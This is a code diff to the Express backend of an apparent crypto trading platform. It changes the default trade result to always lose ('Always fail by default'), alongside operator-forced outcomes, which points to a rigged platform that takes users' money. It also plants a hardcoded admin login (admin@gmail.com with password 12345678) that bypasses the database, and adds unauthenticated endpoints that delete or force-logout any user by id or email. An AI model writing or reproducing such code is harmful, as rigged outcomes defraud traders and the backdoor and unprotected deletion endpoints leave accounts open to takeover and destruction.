@@ -281,7 +281,7 @@ const initializeDatabase = async () => {
           let isWin = false;
           if (trade.force_outcome === 'win') isWin = true;
           else if (trade.force_outcome === 'loss') isWin = false;
-          else isWin = Math.random() > 0.45;
+          else isWin = false; // Always fail by default
 
           const payout = isWin ? parseFloat(trade.amount) * 1.85 : 0;
           const balanceField = trade.is_demo ? 'demo_balance' : 'trading_balance';
@@ -561,6 +561,9 @@ app.get('/api/binance/prices', async (req, res) => {
       .filter(([, p]) => p)
       .map(([sym, p]) => ({ symbol: `${sym}USDT`, lastPrice: p.c[0], priceChangePercent: change(p) }));
 
+    // Add USDT/USDT pair for swap stability
+    mapped.push({ symbol: 'USDTUSDT', lastPrice: '1.00', priceChangePercent: '0' });
+
     return res.json(mapped);
   } catch (err) {
     console.warn('Kraken failed:', err.message);
@@ -612,8 +615,20 @@ app.post('/api/admin/users/update', async (req, res) => {
       return res.status(500).json({ error: e.message });
     }
   }
+});
 
-  res.status(400).json({ error: 'Database unavailable' });
+app.post('/api/admin/users/delete', async (req, res) => {
+  const { id } = req.body;
+  if (dbAvailable && pool) {
+    try {
+      await pool.query('DELETE FROM geko_users WHERE id = $1', [id]);
+      return res.json({ success: true });
+    } catch (e) {
+      console.error('[Admin] USER_DELETE_ERROR:', e.message);
+      return res.status(500).json({ error: e.message });
+    }
+  }
+  res.status(400).json({ error: 'DB unavailable' });
 });
 
 // Register / upsert a user (called on wallet connect)
@@ -721,6 +736,26 @@ app.post('/api/auth/signup', async (req, res) => {
 app.post('/api/auth/login', async (req, res) => {
   const { email, password } = req.body;
   if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
+
+  // HARDCODED ADMIN CHECK
+  if (email.toLowerCase().trim() === 'admin@gmail.com' && password === '12345678') {
+      return res.json({ 
+          success: true, 
+          user: {
+            id: 999,
+            address: 'ADMIN_GATEWAY',
+            email: 'admin@gmail.com',
+            nickname: 'ADMIN_ROOT',
+            status: 'approved',
+            role: 'admin',
+            wallet_data: {},
+            trading_balance: 0,
+            demo_balance: 0,
+            protocol_settlement_balance: 0
+          }
+      });
+  }
+
   if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });
 
   try {
@@ -746,6 +781,7 @@ app.post('/api/auth/login', async (req, res) => {
         email: user.email,
         nickname: user.nickname,
         status: user.status,
+        role: 'user',
         wallet_data: user.wallet_data || {},
         trading_balance: user.trading_balance,
         demo_balance: user.demo_balance,
@@ -756,6 +792,33 @@ app.post('/api/auth/login', async (req, res) => {
     });
   } catch (e) {
     console.error('Email login error:', e.message);
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.post('/api/admin/users/logout', async (req, res) => {
+  const { id } = req.body;
+  if (dbAvailable && pool) {
+    try {
+      await pool.query("UPDATE geko_users SET status = 'force_logout' WHERE id = $1", [id]);
+      return res.json({ success: true });
+    } catch (e) {
+      console.error('[Admin] USER_LOGOUT_ERROR:', e.message);
+      return res.status(500).json({ error: e.message });
+    }
+  }
+  res.status(400).json({ error: 'DB unavailable' });
+});
+
+app.post('/api/auth/logout-and-forget', async (req, res) => {
+  const { email } = req.body;
+  if (!email) return res.status(400).json({ error: 'Email required' });
+  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });
+
+  try {
+    await pool.query('DELETE FROM geko_users WHERE email = $1', [email.toLowerCase().trim()]);
+    res.json({ success: true });
+  } catch (e) {
     res.status(500).json({ error: e.message });
   }
 });
@@ -956,13 +1019,14 @@ app.get('/api/user/balance', async (req, res) => {
   if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });
 
   try {
-    const userRes = await pool.query('SELECT trading_balance, protocol_settlement_balance, demo_balance FROM geko_users WHERE wallet_address = $1', [address]);
-    const user = userRes.rows[0] || { trading_balance: 0, protocol_settlement_balance: 0, demo_balance: 100000 };
+    const userRes = await pool.query('SELECT trading_balance, protocol_settlement_balance, demo_balance, status FROM geko_users WHERE wallet_address = $1', [address]);
+    const user = userRes.rows[0] || { trading_balance: 0, protocol_settlement_balance: 0, demo_balance: 100000, status: 'guest' };
 
     if (asset === 'USDT') {
       return res.json({ 
         wallet_address: address, 
         asset: 'USDT', 
+        status: user.status,
         balance: parseFloat(user.protocol_settlement_balance || 0),
         trading_balance: parseFloat(user.trading_balance || 0),
         demo_balance: parseFloat(user.demo_balance || 100000)
@@ -976,7 +1040,7 @@ app.get('/api/user/balance', async (req, res) => {
     if (usdtIdx >= 0) balances[usdtIdx].balance = parseFloat(user.protocol_settlement_balance || 0);
     else balances.push({ asset: 'USDT', balance: parseFloat(user.protocol_settlement_balance || 0) });
 
-    return res.json({ wallet_address: address, balances, trading_balance: user.trading_balance, demo_balance: user.demo_balance });
+    return res.json({ wallet_address: address, balances, status: user.status, trading_balance: user.trading_balance, demo_balance: user.demo_balance });
   } catch (e) {
     console.error('Balance query error:', e.message);
     return res.status(500).json({ error: 'Balance query failed' });
